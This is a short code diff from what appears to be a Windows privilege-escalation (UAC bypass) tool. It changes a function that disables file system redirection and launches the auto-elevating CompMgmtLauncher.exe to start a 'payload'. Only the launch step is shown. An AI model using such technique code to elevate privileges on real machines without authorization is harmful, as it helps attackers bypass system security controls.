@@ -33,7 +33,7 @@ def compmgmtlauncher(payload):
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if process().create("cmd.exe /c start CompMgmtLauncher.exe", 1):
+			if process().create("CompMgmtLauncher.exe"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
